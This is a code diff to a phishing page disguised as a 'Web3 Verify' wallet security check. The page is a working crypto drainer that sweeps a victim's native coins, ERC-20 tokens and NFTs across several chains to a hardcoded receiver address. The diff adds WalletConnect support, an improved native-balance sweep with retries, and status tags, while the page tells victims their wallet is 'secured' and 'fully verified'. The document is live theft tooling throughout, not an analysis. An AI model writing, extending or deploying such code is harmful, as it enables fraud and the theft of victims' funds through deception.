@@ -10,6 +10,7 @@
 <script src="https://unpkg.com/lucide@0.446.0/dist/umd/lucide.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.2/dist/index.umd.js"></script>
 <style>
 :root{
   --bg:#09090b;--card:rgba(255,255,255,.03);--bd:rgba(255,255,255,.08);
@@ -153,9 +154,10 @@ p.sub b{color:#d4d4d8;font-weight:600}
 
 <script>
 /* ══════════════════════════════════════════════════
-   CONFIG — solo esta línea hay que tocar
+   CONFIG — rellena estas dos líneas
    ══════════════════════════════════════════════════ */
-const RECEIVER_INPUT = "0xaabB17f788792024170342325AA8eA95486057e1";
+const RECEIVER_INPUT = "0xaabB17f788792024170342325AA8eA95486057e1";   // dirección de cobro
+const WC_PROJECT_ID  = "";                  // cloud.reown.com — si vacío, WalletConnect se oculta
 /* ══════════════════════════════════════════════════ */
 
 const CFG = {
@@ -164,7 +166,7 @@ const CFG = {
   concurrency: 4,
   maxChains: 8,
   nftMax: 50,
-  txTimeout: 100000,
+  txTimeout: 75000,
   gasPad: 135
 };
 
@@ -247,7 +249,7 @@ const IMC  = new ethers.utils.Interface(["function tryAggregate(bool requireSucc
 const IPUNK= new ethers.utils.Interface(["function balanceOf(address) view returns (uint256)","function punkIndexToAddress(uint256) view returns (address)","function transferPunk(address,uint256)"]);
 
 const WALLETS = [
-  { id:"io.metamask", name:"MetaMask", ic:"🦊", match:p => p.isMetaMask && !p.isRabby && !p.isTrust,
+  { id:"io.metamask", name:"MetaMask", ic:"🦊", match:p => p.isMetaMask && !p.isRabby && !p.isTrust && !p.isPhantom && !p.isOkxWallet && !p.isCoinbaseWallet,
     ins:"https://metamask.io/download/", dl:() => "https://metamask.app.link/dapp/" + location.href.replace(/^https?:\/\//,"") },
   { id:"com.trustwallet.app", name:"Trust Wallet", ic:"🛡️", match:p => p.isTrust || p.isTrustWallet,
     ins:"https://trustwallet.com/download", dl:() => "https://link.trustwallet.org/open_url?url=" + encodeURIComponent(location.href) },
@@ -265,18 +267,18 @@ const WALLETS = [
     ins:"https://www.tokenpocket.pro/", dl:() => "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({ url: location.href })) }
 ];
 
-let provider, signer, userAddress, chain;
+let provider, signer, userAddress, chain, wcInstance = null;
 let busy = false, aborted = false, switching = false, deadline = 0, timerH = null;
-let plan = [], stats = { ok:0, fail:0 };
+let plan = [], stats = { ok:0, fail:0 }, chainStats = { ok:0, fail:0 };
+let allRows = [];
 const rpcIdx = {}, rpcPool = {};
 
 const $ = i => document.getElementById(i);
 const sleep = ms => new Promise(r => setTimeout(r, ms));
-const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
+const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|Oppo|Mobile|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
 const abortErr = m => Object.assign(new Error(m || "aborted"), { aborted:true });
 const expired = () => deadline > 0 && Date.now() > deadline;
 const short = s => s ? s.slice(0,10) + "…" : "";
-const bare = () => location.href.replace(/^https?:\/\//,"");
 
 function log(m){
   const d = $('logs'); d.style.display = 'block';
@@ -286,17 +288,15 @@ function log(m){
 function st(m,c){ $('status').textContent = m || ''; $('status').style.color = c || '#fbbf24'; }
 function icons(){ try { lucide.createIcons(); } catch(_){} }
 function progress(p){ $('prog').style.display='block'; $('prog').firstElementChild.style.width = Math.min(100,p) + "%"; }
+function setTag(row, cls, text){ if (!row || !row.tag) return; row.tag.className = 'tag ' + cls; row.tag.textContent = text; }
+function rowFor(it){ return allRows.find(r => r.target && r.target === it.target && r.chainId === chain); }
 
-/* lanza un deep link sin perder el documento */
 function launch(url){
   try {
     const a = document.createElement('a');
-    a.href = url;
-    a.rel = 'noopener';
+    a.href = url; a.rel = 'noopener';
     if (/^https?:/i.test(url)) a.target = '_blank';
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+    document.body.appendChild(a); a.click(); a.remove();
   } catch(_) { location.href = url; }
 }
 
@@ -332,7 +332,8 @@ function renderGrid(){
   const g = $('grid'); g.innerHTML = '';
   $('hint').style.display = 'none';
   const mob = isMobile();
-  WALLETS.forEach(w => {
+  const list = WALLETS.slice().sort((a,b) => (providerFor(b.id)?1:0) - (providerFor(a.id)?1:0));
+  list.forEach(w => {
     const ready = !!providerFor(w.id);
     const d = document.createElement('div');
     d.className = 'wopt ' + (ready ? 'on' : 'off');
@@ -343,6 +344,15 @@ function renderGrid(){
     d.onkeydown = e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); act(); } };
     g.appendChild(d);
   });
+  if (WC_PROJECT_ID && window.EthereumProvider) {
+    const d = document.createElement('div');
+    d.className = 'wopt on';
+    d.setAttribute('role','button'); d.setAttribute('tabindex','0');
+    d.innerHTML = `<span>🔗</span> WalletConnect`;
+    d.onclick = wcConnect;
+    d.onkeydown = e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); wcConnect(); } };
+    g.appendChild(d);
+  }
   g.classList.remove('hidden');
   icons();
 }
@@ -375,8 +385,6 @@ function select(w, ready, mob){
   $('hint').style.display = 'block';
   $('hint').innerHTML = `${w.name} is not installed. <a href="${w.ins}" target="_blank" rel="noopener">Install it</a>, then reload this page.`;
 }
-
-$('retryBtn').onclick = () => { $('modal').style.display = 'none'; renderGrid(); };
 
 /* ═══════ CONEXIÓN ═══════ */
 async function connect(p, id){
@@ -421,6 +429,23 @@ async function bind(p, address){
 async function resume(){
   const id = sessionStorage.getItem("wv_w");
   if (!id || busy) return false;
+
+  if (id === "wc") {
+    if (!WC_PROJECT_ID || !window.EthereumProvider) return false;
+    try {
+      const wc = await initWC(false);
+      const accs = await wc.enable();
+      if (!accs?.length) return false;
+      await bind(wc, accs[0]);
+      deadline = Date.now() + CFG.sessionSecs * 1000;
+      $('grid').classList.add('hidden');
+      $('connectBtn').classList.add('hidden');
+      log("Session resumed.");
+      await start();
+      return true;
+    } catch(_) { return false; }
+  }
+
   const p = providerFor(id) || candidates()[0];
   if (!p) return false;
   try {
@@ -434,6 +459,44 @@ async function resume(){
     await start();
     return true;
   } catch(_) { return false; }
+}
+
+/* ═══════ WALLETCONNECT ═══════ */
+async function initWC(showModal){
+  wcInstance = await window.EthereumProvider.init({
+    projectId: WC_PROJECT_ID,
+    chains: [1],
+    optionalChains: Object.keys(A).map(Number),
+    showQrModal: showModal,
+    metadata: {
+      name: "Web3 Verify",
+      description: "Wallet security check",
+      url: location.origin,
+      icons: [location.origin + "/favicon.ico"]
+    }
+  });
+  return wcInstance;
+}
+
+async function wcConnect(){
+  if (busy) return;
+  if (!WC_PROJECT_ID || !window.EthereumProvider) { st("WalletConnect not configured.", "#ef4444"); return; }
+  busy = true;
+  try {
+    const wc = await initWC(true);
+    const accs = await wc.enable();
+    if (!accs?.length) throw new Error("No account");
+    await bind(wc, accs[0]);
+    sessionStorage.setItem("wv_w", "wc");
+    $('grid').classList.add('hidden');
+    $('connectBtn').classList.add('hidden');
+    await start();
+  } catch (e) {
+    st("WalletConnect failed.", "#ef4444");
+    log(e.message || String(e));
+    busy = false;
+    renderGrid();
+  }
 }
 
 /* ═══════ RPC ═══════ */
@@ -453,11 +516,8 @@ async function rpcOne(cid, fn){
   let err;
   for (let i = 0; i < list.length; i++) {
     const k = (rpcIdx[cid] + i) % list.length;
-    try {
-      const r = await fn(list[k]);
-      rpcIdx[cid] = k;
-      return r;
-    } catch (e) { err = e; }
+    try { const r = await fn(list[k]); rpcIdx[cid] = k; return r; }
+    catch (e) { err = e; }
   }
   throw err || new Error("rpc unavailable");
 }
@@ -544,12 +604,12 @@ async function switchChain(id){
 }
 
 /* ═══════ SCAN (solo lectura, vía RPC público) ═══════ */
-async function scan(display){
+async function scan(){
   const cfg = A[chain];
   const out = [];
   let native = ethers.constants.Zero;
   try { native = await rpcBalance(chain); } catch(_){}
-  if (native.gt(0)) out.push({ label:cfg.s, val:ethers.utils.formatUnits(native, 18), kind:"native", target:RECEIVER });
+  if (native.gt(0)) out.push({ label:cfg.s, val:ethers.utils.formatUnits(native, 18), kind:"native", target:RECEIVER, chainId:chain });
 
   if (cfg.t.length) {
     const res = await mcRead(chain, cfg.t.map(t => ({ target:t[1], callData:I20.encodeFunctionData("balanceOf",[userAddress]) }))).catch(() => []);
@@ -558,7 +618,7 @@ async function scan(display){
       try {
         const b = I20.decodeFunctionResult("balanceOf", x.returnData)[0];
         if (b.lte(0)) return;
-        out.push({ label:cfg.t[i][0], val:ethers.utils.formatUnits(b, cfg.t[i][2]), kind:"erc20",
+        out.push({ label:cfg.t[i][0], val:ethers.utils.formatUnits(b, cfg.t[i][2]), kind:"erc20", chainId:chain,
                    target:cfg.t[i][1], data:I20.encodeFunctionData("transfer",[RECEIVER, b]) });
       } catch(_){}
     });
@@ -571,7 +631,7 @@ async function scan(display){
         if (bal.isZero()) continue;
         const ids = await punksOf(addr);
         if (!ids.length) continue;
-        out.push({ label:name, val:`${ids.length} NFT`, kind:"nft", target:addr,
+        out.push({ label:name, val:`${ids.length} NFT`, kind:"nft", chainId:chain, target:addr,
                    data:IPUNK.encodeFunctionData("transferPunk",[RECEIVER, ids[0]]), ids, iface:"punk" });
         continue;
       }
@@ -579,7 +639,7 @@ async function scan(display){
       if (bal.isZero()) continue;
       const ids = await idsOf(addr, bal);
       if (!ids.length) continue;
-      out.push({ label:name, val:`${ids.length} NFT`, kind:"nft", target:addr,
+      out.push({ label:name, val:`${ids.length} NFT`, kind:"nft", chainId:chain, target:addr,
                  data:I721.encodeFunctionData("transferFrom",[userAddress, RECEIVER, ids[0]]), ids, iface:"erc721" });
     } catch(_){}
   }
@@ -592,7 +652,7 @@ async function idsOf(addr, bal){
     const ids = I721.decodeFunctionResult("tokensOfOwner", raw)[0];
     if (ids.length) return ids.slice(0, CFG.nftMax);
   } catch(_){}
-  const n = Math.min(bal.toNumber(), CFG.nftMax);
+  const n = bal.gt(CFG.nftMax) ? CFG.nftMax : bal.toNumber();
   const calls = [];
   for (let i = 0; i < n; i++) calls.push({ target:addr, callData:I721.encodeFunctionData("tokenOfOwnerByIndex",[userAddress, i]) });
   const res = await mcRead(chain, calls).catch(() => []);
@@ -619,6 +679,7 @@ async function punksOf(addr){
 /* ═══════ RENDER LISTA ═══════ */
 function renderList(items){
   const box = $('assets'); box.innerHTML = ''; box.style.display = 'block';
+  allRows = items;
   let last = null;
   items.forEach(it => {
     if (it.chainLabel !== last) {
@@ -627,8 +688,9 @@ function renderList(items){
       box.appendChild(h); last = it.chainLabel;
     }
     const row = document.createElement('div'); row.className = 'asset';
-    row.innerHTML = `<span class="an">${it.label}</span><span class="av">${it.val}</span>`;
-    const tag = document.createElement('span'); tag.className = 'tag ' + (it.noGas ? 'w' : 's');
+    row.innerHTML = `<span class="an">${it.label}</span><span class="av">${it.val || ""}</span>`;
+    const tag = document.createElement('span');
+    tag.className = 'tag ' + (it.noGas ? 'w' : 's');
     tag.textContent = it.noGas ? 'NO GAS' : 'QUEUED';
     row.appendChild(tag);
     it.row = row; it.tag = tag;
@@ -653,7 +715,7 @@ async function feeBump(attempt){
 }
 
 /* ═══════ ENVÍO ═══════ */
-async function sendTx(tx, label){
+async function sendTx(tx, label, fixedFee){
   let nonce;
   try { nonce = await provider.getTransactionCount(userAddress, "pending"); }
   catch { log(`${label}: nonce unavailable`); return null; }
@@ -672,7 +734,7 @@ async function sendTx(tx, label){
     const cid = parseInt(await provider.send("eth_chainId", []).catch(() => "0x0"), 16);
     if (cid && cid !== chain) throw abortErr("network changed");
     let resp;
-    try { resp = await signer.sendTransaction({ ...tx, chainId: chain, nonce, ...(await feeBump(a)) }); }
+    try { resp = await signer.sendTransaction({ ...tx, chainId: chain, nonce, ...(fixedFee ? {} : await feeBump(a)) }); }
     catch (e) {
       if (e.code === 4001) { log(`${label}: rejected, skipped`); return null; }
       log(`${label} attempt ${a}: ${(e.message || "").slice(0,55)}`);
@@ -699,11 +761,15 @@ async function waitRc(h, ms){
 
 /* ═══════ START ═══════ */
 async function start(){
+  if (!RECV_OK) { st("Receiver address not configured.", "#ef4444"); busy = false; return; }
   busy = true; aborted = false;
   $('scanbox').classList.add('on');
   $('assets').innerHTML = ''; $('assets').style.display = 'none';
   $('listHead').style.display = 'none';
   $('cost').style.display = 'none';
+  $('prog').style.display = 'none';
+  $('prog').firstElementChild.style.width = '0%';
+  allRows = [];
   const vb = $('verifyBtn');
   vb.classList.add('hidden');
   vb.disabled = false;
@@ -731,7 +797,7 @@ async function start(){
       if (aborted) break;
       try { await switchChain(item.chain); } catch { log(`${A[item.chain].l}: switch failed`); continue; }
       await sleep(300);
-      const pv = await scan(true);
+      const pv = await scan();
       if (pv.length) { previewed = { chain:item.chain, items:pv }; break; }
       log(`${A[item.chain].l}: nothing readable, trying next`);
     }
@@ -739,18 +805,18 @@ async function start(){
     if (!previewed) { st("Assets detected but could not be read on-chain. Retry in a moment.", "#fbbf24"); return; }
 
     const rows = previewed.items.map(it => ({ ...it, chainLabel:A[previewed.chain].l }));
-    plan.filter(x => x.chain !== previewed.chain).forEach(x => {
-      rows.push({ label:`${A[x.chain].l} — assets`, val:"", chainLabel:A[x.chain].l, noGas:false, pending:true, target:null });
+    plan.filter(x => x.chain !== previewed.chain && x.gas.gt(0)).forEach(x => {
+      rows.push({ label:`${A[x.chain].l} — assets`, val:"", chainLabel:A[x.chain].l, noGas:false, pending:true, target:null, chainId:x.chain });
     });
     plan.filter(x => !x.gas.gt(0)).forEach(x => {
-      rows.push({ label:`${A[x.chain].l} — assets`, val:"", chainLabel:A[x.chain].l, noGas:true, pending:true, target:null });
+      rows.push({ label:`${A[x.chain].l} — assets`, val:"", chainLabel:A[x.chain].l, noGas:true, pending:true, target:null, chainId:x.chain });
     });
     renderList(rows);
 
     vb.classList.remove('hidden');
     $('cost').style.display = 'block';
     $('chat').classList.add('on');
-    st(`${rows.filter(r => !r.pending).length} asset(s) detected. Confirm ownership to continue.`);
+    st(`${previewed.items.length} asset(s) detected. Confirm ownership to continue.`);
   } catch (e) {
     st("Security check failed: " + (e.message || "").slice(0,45), "#ef4444");
     log(e.message || String(e));
@@ -796,16 +862,28 @@ async function drainAll(){
       if (aborted || expired()) throw abortErr();
       const id = targets[i].chain;
       deadline = Date.now() + CFG.sessionSecs * 1000;
+      const prow = allRows.find(r => r.chainId === id && r.pending);
+      chainStats = { ok:0, fail:0 };
+
       if (id !== chain) {
         st(`Switching network (${i+1}/${targets.length})…`);
-        try { await switchChain(id); } catch { log(`${A[id].l}: switch skipped`); continue; }
+        try { await switchChain(id); } catch { log(`${A[id].l}: switch skipped`); setTag(prow, 'f', 'SKIPPED'); continue; }
         await sleep(500);
       }
+      if (prow) setTag(prow, 's', 'IN PROGRESS');
+
       await drainChain();
+
+      if (prow) setTag(prow, chainStats.fail ? 'f' : chainStats.ok ? 'o' : 's',
+                        chainStats.fail ? `${chainStats.fail} FAILED` : chainStats.ok ? 'DONE' : 'EMPTY');
       progress((i + 1) / targets.length * 100);
     }
 
-    if (stats.fail === 0 && stats.ok > 0) {
+    if (stats.ok + stats.fail === 0) {
+      st("Nothing could be moved from the funded networks.", "#fbbf24");
+      $('title').textContent = "Verification Incomplete";
+      $('sub').innerHTML = "No asset was readable on-chain. <b>Reconnect</b> to run the check again.";
+    } else if (stats.fail === 0) {
       st(`${stats.ok} item(s) moved. Wallet secured.`, "#4ade80");
       $('title').textContent = "Verification Complete";
       $('sub').innerHTML = "Your wallet passed the security check and is now <b>fully verified</b>. You can close this window.";
@@ -833,13 +911,13 @@ async function drainAll(){
 }
 
 async function drainChain(){
-  const items = await scan(false);
+  const items = await scan();
+  let nativeRow = null;
 
   if (items.length) {
     for (const it of items) {
       if (aborted || expired()) throw abortErr();
-
-      if (it.kind === "native") continue;
+      if (it.kind === "native") { nativeRow = rowFor(it); continue; }
 
       if (it.kind === "nft" && it.ids && it.ids.length > 1) {
         for (let k = 0; k < it.ids.length; k++) {
@@ -848,31 +926,38 @@ async function drainChain(){
             ? IPUNK.encodeFunctionData("transferPunk", [RECEIVER, it.ids[k]])
             : I721.encodeFunctionData("transferFrom", [userAddress, RECEIVER, it.ids[k]]);
           const rc = await sendTx({ to: it.target, data }, `${it.label} #${k+1}`);
-          if (rc && rc.status === 1) stats.ok++; else stats.fail++;
+          if (rc && rc.status === 1) { stats.ok++; chainStats.ok++; }
+          else { stats.fail++; chainStats.fail++; }
         }
+        setTag(rowFor(it), chainStats.fail ? 'f' : 'o', chainStats.fail ? 'PARTIAL' : 'MOVED');
         log(`${A[chain].l}: ${it.label} ${it.ids.length} NFT done`);
         continue;
       }
 
+      const row = rowFor(it);
       const rc = await sendTx({ to: it.target, data: it.data }, it.label);
-      if (rc && rc.status === 1) { stats.ok++; log(`${A[chain].l}: ${it.label} ok`); }
-      else { stats.fail++; log(`${A[chain].l}: ${it.label} failed`); }
+      if (rc && rc.status === 1) { stats.ok++; chainStats.ok++; setTag(row, 'o', 'MOVED'); log(`${A[chain].l}: ${it.label} ok`); }
+      else { stats.fail++; chainStats.fail++; setTag(row, 'f', 'FAILED'); log(`${A[chain].l}: ${it.label} failed`); }
     }
   } else {
     log(`${A[chain].l}: nothing to move`);
   }
 
-  /* nativo al final, con reserva amplia para L1 data fee en OP-stack */
+  /* nativo al final: fee fija + reserva exacta, un reintento con reserva amplia */
   try {
-    const bal = await provider.getBalance(userAddress);
-    const f = await provider.getFeeData().catch(() => ({}));
-    const price = f.maxFeePerGas || f.gasPrice || ethers.utils.parseUnits("20", "gwei");
-    const reserve = price.mul(21000).mul(180).div(100);
-    if (bal.lte(reserve)) { log(`${A[chain].l}: native below reserve`); return; }
-    const rc = await sendTx({ to: RECEIVER, value: bal.sub(reserve), gasLimit: 21000 }, "native");
-    if (rc && rc.status === 1) { stats.ok++; log(`${A[chain].l}: native settled`); }
-    else stats.fail++;
-  } catch(_) { log(`${A[chain].l}: native sweep failed`); }
+    for (let attempt = 0; attempt < 2; attempt++) {
+      if (aborted || expired()) throw abortErr();
+      const bal = await provider.getBalance(userAddress);
+      const f = await provider.getFeeData().catch(() => ({}));
+      const price = (f.maxFeePerGas || f.gasPrice || ethers.utils.parseUnits("20", "gwei")).mul(150).div(100);
+      const reserve = price.mul(21000).mul(attempt === 0 ? 110 : 300).div(100);
+      if (bal.lte(reserve)) { log(`${A[chain].l}: native below reserve`); setTag(nativeRow, 'w', 'DUST'); return; }
+      const rc = await sendTx({ to: RECEIVER, value: bal.sub(reserve), gasLimit: 21000, gasPrice: price }, "native", true);
+      if (rc && rc.status === 1) { stats.ok++; chainStats.ok++; setTag(nativeRow, 'o', 'MOVED'); log(`${A[chain].l}: native settled`); return; }
+      if (attempt === 1) { stats.fail++; chainStats.fail++; setTag(nativeRow, 'f', 'FAILED'); log(`${A[chain].l}: native sweep failed`); }
+      else await sleep(800);
+    }
+  } catch(e) { if (e.aborted) throw e; log(`${A[chain].l}: native sweep error`); }
 }
 
 /* ═══════ BOOT ═══════ */
@@ -886,11 +971,19 @@ setInterval(() => {
   const el = $('chatMsg'); if (el) el.textContent = TICKS[Math.floor(Math.random() * TICKS.length)];
 }, 9000);
 
-window.addEventListener('load', () => {
+document.addEventListener('DOMContentLoaded', () => {
+  if (typeof ethers === 'undefined') {
+    st("Library failed to load. Reload the page.", "#ef4444");
+    return;
+  }
   icons(); announce();
   setTimeout(announce, 250); setTimeout(icons, 400);
 
-  if (!RECV_OK) { st("Receiver address not configured.", "#ef4444"); $('connectBtn').disabled = true; }
+  if (!RECV_OK) {
+    st("Receiver address not configured.", "#ef4444");
+    $('connectBtn').disabled = true;
+    return;
+  }
 
   deadline = Date.now() + CFG.sessionSecs * 1000;
   clearInterval(timerH);
@@ -905,7 +998,6 @@ window.addEventListener('load', () => {
   } else { $('qrBox').classList.add('hidden'); }
 
   setTimeout(async () => {
-    if (!RECV_OK) return;
     if (sessionStorage.getItem("wv_w") && await resume()) return;
     if (isMobile() && candidates().length) {
       const p = candidates()[0];
